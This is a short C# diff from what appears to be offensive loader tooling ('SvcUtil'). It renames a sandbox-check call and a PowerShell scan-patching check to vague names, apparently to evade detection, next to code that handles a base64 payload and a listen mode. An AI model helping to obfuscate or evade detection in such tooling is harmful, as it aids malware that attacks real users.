@@ -52,7 +52,7 @@ namespace SvcUtil
 
             if (_payloadB64 != null)
             {
-                if (!_noSandbox && !EnvCheck.PassAllChecks())
+                if (!_noSandbox && !Env.Go())
                     return;
 
                 byte[] payload;
@@ -96,7 +96,7 @@ namespace SvcUtil
 
             // ── Shell mode ──────────────────────────────────────────────
 
-            if (!_scanExplicit && ScanPatch.IsPowerShell(_command))
+            if (!_scanExplicit && Ctx.Chk(_command))
                 _scanPatch = true;
 
             if (_listenMode)
